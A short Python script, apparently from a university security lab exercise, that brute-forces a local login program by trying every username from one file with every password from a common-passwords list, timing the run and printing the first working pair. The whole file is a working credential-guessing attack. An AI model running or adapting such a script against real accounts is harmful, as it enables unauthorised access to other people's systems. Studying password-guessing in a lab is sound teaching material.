import subprocess
import time

# Define the file paths for the password list and username list
password_file_path = "/home/cse/Lab1/Q2/MostCommonPWs"
username_file_path = "/home/cse/Lab1/Q2/gang"

# Open the password file and read all passwords
with open(password_file_path) as password_file:
    passwords = [line.rstrip('\n') for line in password_file]

# Open the username file and read all usernames
with open(username_file_path) as user_file:
    usernames = [line.rstrip('\n') for line in user_file]

# Start tracking the time
start_time = time.time()
print(f'Start time: {start_time:.4f}')

# Loop through each username and password combination
for username in usernames:
    for password in passwords:
        # Execute the login script
        login_result = subprocess.run(
            ["python3", "Login.pyc", username, password],
            capture_output=True,
            text=True,
            cwd="/home/cse/Lab1/Q2/"
        )
        
        # Check if login was successful
        if login_result.stdout.strip() == "Login successful.":
            print(login_result.stdout)
            print(f"Successful login found: {username} -> {password}")
            print(f"Total time taken: {time.time() - start_time:.4f} seconds")
            exit()

print(f"Total time taken: {time.time() - start_time:.4f} seconds")